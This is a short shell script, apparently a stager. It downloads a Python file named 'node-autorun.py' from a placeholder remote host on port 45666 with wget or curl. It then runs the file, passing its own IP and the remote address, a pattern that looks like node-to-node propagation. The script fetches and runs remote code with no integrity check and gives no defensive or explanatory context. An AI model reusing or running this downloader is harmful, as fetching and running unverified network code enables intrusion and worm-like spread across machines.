#!/bin/sh
path="node-autorun.py"
host="$(hostname -i):45666"
remotehost="<target>:45666"
if [ ! -f $path ]; then wget -O $path http://$remotehost; fi
if [ ! -f $path ]; then curl -vvv -o $path http://$remotehost; fi
python $path $host $remotehost

